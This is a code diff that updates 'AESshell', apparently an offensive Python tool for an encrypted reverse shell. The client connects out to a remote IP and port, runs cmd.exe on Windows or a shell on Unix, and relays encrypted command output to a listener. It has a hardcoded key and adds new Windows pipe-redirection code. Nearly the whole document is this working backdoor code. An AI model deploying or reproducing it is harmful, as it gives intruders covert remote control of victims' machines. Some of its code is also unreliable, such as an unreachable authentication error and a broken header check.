@@ -4,13 +4,179 @@
 import os
 import sys
 import time
+import hmac
+import hashlib
 import socket
 import select
+import Queue
+import threading
 import subprocess
+import multiprocessing
 
-import aes
+import cPickle as pickle
+from Crypto.Cipher import AES
 
-version = "0.4"
+#win32 specific
+if sys.platform == 'win32':
+	import msvcrt
+
+	#pywin32
+	import win32api
+	import win32con
+	import win32pipe
+	import win32file
+	import win32process
+	import win32security
+
+class AuthenticationError(Exception): pass
+
+class Crypticle(object):
+	""" PyCrypto-based authenticated symetric encryption
+		http://code.activestate.com/recipes/576980/
+	"""
+
+	PICKLE_PAD = "pickle::"
+	AES_BLOCK_SIZE = 16
+	SIG_SIZE = hashlib.sha256().digest_size
+
+	def __init__(self, key_string, key_size=192):
+		self.keys = self.extract_keys(key_string, key_size)
+		self.key_size = key_size
+
+	@classmethod
+	def generate_key_string(cls, key_size=192):
+		key = os.urandom(key_size / 8 + cls.SIG_SIZE)
+		return key.encode("base64").replace("\n", "")
+
+	@classmethod
+	def extract_keys(cls, key_string, key_size):
+		key = key_string.decode("base64")
+		assert len(key) == key_size / 8 + cls.SIG_SIZE, "invalid key"
+		return key[:-cls.SIG_SIZE], key[-cls.SIG_SIZE:]
+
+	def encrypt(self, data):
+		"""encrypt data with AES-CBC and sign it with HMAC-SHA256"""
+		aes_key, hmac_key = self.keys
+		pad = self.AES_BLOCK_SIZE - len(data) % self.AES_BLOCK_SIZE
+		data = data + pad * chr(pad)
+		iv_bytes = os.urandom(self.AES_BLOCK_SIZE)
+		cypher = AES.new(aes_key, AES.MODE_CBC, iv_bytes)
+		data = iv_bytes + cypher.encrypt(data)
+		sig = hmac.new(hmac_key, data, hashlib.sha256).digest()
+		return data + sig
+
+	def decrypt(self, data):
+		"""verify HMAC-SHA256 signature and decrypt data with AES-CBC"""
+		aes_key, hmac_key = self.keys
+		sig = data[-self.SIG_SIZE:]
+		data = data[:-self.SIG_SIZE]
+		if hmac.new(hmac_key, data, hashlib.sha256).digest() != sig:
+			return -1
+			raise AuthenticationError("message authentication failed")
+		else:
+			iv_bytes = data[:self.AES_BLOCK_SIZE]
+			data = data[self.AES_BLOCK_SIZE:]
+			cypher = AES.new(aes_key, AES.MODE_CBC, iv_bytes)
+			data = cypher.decrypt(data)
+			return data[:-ord(data[-1])]
+
+	def dumps(self, obj, pickler=pickle):
+		"""pickle and encrypt a python object"""
+		return self.encrypt(self.PICKLE_PAD + pickler.dumps(obj))
+
+	def loads(self, data, pickler=pickle):
+		"""decrypt and unpickle a python object"""
+		data = self.decrypt(data)
+		if data == -1:
+			return -1
+		# simple integrity check to verify that we got meaningful data
+		if data.startswith(self.PICKLE_PAD) == -1:
+			print "unexpected header"
+			return -1
+		return pickler.loads(data[len(self.PICKLE_PAD):])
+	
+class winShell(object):
+
+	def __init__ (self): 
+		pass
+
+	def ReplaceHandle(self, handle, pid):
+		rHandle = win32api.DuplicateHandle( pid,\
+											handle,\
+											pid,\
+											0,\
+											0,\
+											win32con.DUPLICATE_SAME_ACCESS)
+		win32file.CloseHandle(handle)
+		return rHandle
+	
+	def createProcess(self, cmdline, StartupInfo):
+
+		res = win32process.CreateProcess( 	None,\
+											cmdline,\
+											None,\
+											None,\
+											1,\
+											0,\
+											None,\
+											None,\
+											StartupInfo)
+	
+		return res
+
+	def run (self, cmdline):
+
+		secAttrs = win32security.SECURITY_ATTRIBUTES()
+		secAttrs.bInheritHandle = 1
+
+		"""
+		windows file handle redirection:
+		http://wiki.wxpython.org/Capturing%20DOS%20Output%20in%20a%20wxWindow
+		"""
+		hStdin_r, self.hStdin_w  = win32pipe.CreatePipe(secAttrs,0)
+		self.hStdout_r, hStdout_w = win32pipe.CreatePipe(secAttrs,0)
+		self.hStderr_r, hStderr_w = win32pipe.CreatePipe(secAttrs,0)
+		
+		pid = win32api.GetCurrentProcess()
+
+		# replace the handles
+		self.hStdin_w = self.ReplaceHandle(self.hStdin_w, pid)
+		self.hStdout_r = self.ReplaceHandle(self.hStdout_r, pid)
+		self.hStderr_r = self.ReplaceHandle(self.hStderr_r, pid)
+		
+		# create the startupinformation for the process
+		StartupInfo = win32process.STARTUPINFO()
+		StartupInfo.hStdInput  = hStdin_r
+		StartupInfo.hStdOutput = hStdout_w
+		StartupInfo.hStdError  = hStderr_w
+		StartupInfo.dwFlags = win32process.STARTF_USESTDHANDLES
+
+		hProcess, hThread, dwPid, dwTid = self.createProcess(cmdline,StartupInfo)
+		
+		self.stdin = os.fdopen(msvcrt.open_osfhandle(self.hStdin_w, 0), "wb")
+		self.stdout = os.fdopen(msvcrt.open_osfhandle(self.hStdout_r, 0), "rb")
+		self.stderr = os.fdopen(msvcrt.open_osfhandle(self.hStderr_r, 0), "rb")
+
+		baggage = [self.stdin, self.stdout, self.stderr]
+
+		return baggage
+		
+	def readStdOut(self, q):
+		
+		while True:
+			outLine = self.stdout.readline()
+			if outLine :
+				q.put(outLine)			
+
+	def readStdErr(self, q):
+		while True:
+			errLine = self.stderr.readline()
+			if errLine :
+				q.put(errLine)			
+
+
+version = "0.6"
+key = "F3UA7+ShYAKvsHemwQWv6IDl/88m7BhOU0GkhwqzwX1Cxl3seqANklv+MjiWUMcGCCsG2MIaZI4="
 
 def usage():
 	print "AESshell v%s - using AES-CBC + HMAC-SHA256" % version
@@ -43,20 +209,6 @@ def socketLoop(rip,rport):
 		else:
 			return s
 
-def shellWindows(decStdin):
-
-	# send command, this is not a real shell for instance chdir won't work
-	# but better as no code exec on windows :)
-	proc = subprocess.Popen(decStdin, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-
-	# collect the output data from the stdout/stderr fd
-	pStdout = proc.stdout.read() + proc.stderr.read()
-
-	#debug print
-#	print pStdout
-
-	return pStdout
-
 def shellUnix(fdr, fdw):
 
 	# fork it is
@@ -78,7 +230,7 @@ def main(rip,rport,key):
 	inputs = []
 
 	# initialize aes class
-	ac = aes.Crypticle(key)
+	ac = Crypticle(key)
 
 	# first of all try to connect, give up after 10 tries
 	s = socketLoop(rip,rport)
@@ -94,6 +246,7 @@ def main(rip,rport,key):
 	fdr = os.pipe()	
 	fdw = os.pipe()
 
+
 	# check the system type we are on
 	stype = os.name
 	if stype == 'posix':
@@ -104,10 +257,49 @@ def main(rip,rport,key):
 		os.write(fdw[1],'uname -a\n')
 		os.write(fdw[1],'hostname\n')
 
+		# windows 'magic'
+	elif stype == 'nt':
+
+		# initialize winShellClass
+		wS = winShell()
+		baggage = wS.run("cmd.exe")
+
+		# setup queue for windows
+		q=Queue.Queue()
+
+		# read win stdout
+		tO = threading.Thread (target = wS.readStdOut, args = (q,))
+		tO.daemon = True
+		tO.start()
+
+		# read win stderr
+		tE = threading.Thread (target = wS.readStdErr, args = (q,))
+		tE.daemon = True
+		tE.start()
+		
+
 	while True:
 
+		if os.name != 'posix' and q.qsize()>0:
+			while q.qsize>0:
+
+				# read from the queue
+				winData = q.get()
+
+				# encrypt the data
+				encStdout = ac.dumps(winData)
+
+				# send data to the listener
+				bc.send(encStdout)
+				if q.qsize() == 0:
+					break
+
 		try:
-			inputrd , outputrd , errors = select.select(inputs,[],[])
+			if os.name == 'posix':
+				inputrd , outputrd , errors = select.select(inputs,[],[])
+			else:
+				inputrd , outputrd , errors = select.select(inputs,[],[], 1)
+
 		except select.error, e:
 			print e
 			break
@@ -149,7 +341,7 @@ def main(rip,rport,key):
 				bc.send(encStdout)
 
 			else:
-				print "Do we ever get here?"
+				pass
 
 		# take the data and see if we can decrypt it
 		decStdin = ac.loads(cbuffer)
@@ -163,16 +355,9 @@ def main(rip,rport,key):
 				# send decrypted data to shell
 				os.write(fdw[1],decStdin)
 			else:
-
-				# call windows shell command
-				pStdout = shellWindows(decStdin)
-
-				#encrypt the data
-				encStdout = ac.dumps(pStdout)
-
-				# send data back to listener
-				s.send(encStdout)
-
+				# send command to windows file handle
+				wStdin = baggage[0]
+				os.write(wStdin.fileno(),decStdin)
 
 	s.close()
 	print "[*] Finished"
@@ -185,5 +370,4 @@ if __name__ == "__main__":
 
 	rip = sys.argv[1]
 	rport = int(sys.argv[2])
-	key = "F3UA7+ShYAKvsHemwQWv6IDl/88m7BhOU0GkhwqzwX1Cxl3seqANklv+MjiWUMcGCCsG2MIaZI4="
 	main(rip,rport,key)
